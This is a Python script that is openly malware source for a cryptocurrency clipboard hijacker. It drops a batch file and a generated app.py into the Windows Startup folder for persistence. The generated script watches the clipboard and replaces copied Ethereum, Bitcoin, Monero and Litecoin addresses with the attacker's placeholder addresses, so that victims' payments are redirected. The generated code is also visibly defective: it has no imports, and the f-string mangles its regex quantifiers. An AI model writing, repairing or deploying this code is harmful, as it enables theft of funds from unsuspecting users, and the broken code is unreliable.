import re
import pyperclip 
import time
import shutil
import os

eth = 'ethereum addy'
xmr = 'monero addy'
btc = 'btc addy'
ltc = 'ltc addy'

with open('startup_script.bat', 'w') as file:
    file.write('@echo off\n')
    file.write('python app.py')

startup_folder = os.path.expanduser('~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')

shutil.move('startup_script.bat', os.path.join(startup_folder, 'startup_script.bat'))

with open(os.path.join(startup_folder, 'app.py'), 'w') as file:
    file.write(f"""
ethadd = '{eth}'
xmradd = '{xmr}'
btcadd = '{btc}'
ltcadd = '{ltc}'


def is_valid_ethereum_address(address):
    return re.fullmatch('^0x[a-fA-F0-9]{40}$', address) is not None

def is_valid_bitcoin_address(address):
    return re.fullmatch('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', address) is not None

def is_valid_monero_address(address):
    return re.fullmatch('^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$', address) is not None

def is_valid_litecoin_address(address):
    return re.fullmatch('^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$', address) is not None

previous_clipboard_content = ''




while True:
    current_clipboard_content = pyperclip.paste()
    if current_clipboard_content != previous_clipboard_content:
        previous_clipboard_content = current_clipboard_content
        eth = is_valid_ethereum_address(current_clipboard_content)
        btc = is_valid_bitcoin_address(current_clipboard_content)
        xmr = is_valid_monero_address(current_clipboard_content)
        ltc = is_valid_litecoin_address(current_clipboard_content)
        if eth:
            pyperclip.copy(ethadd)
        elif btc:
            pyperclip.copy(btcadd)
        elif xmr: 
            pyperclip.copy(xmradd)
        elif ltc:
            pyperclip.copy(ltcadd)
    time.sleep(1) """)

    

    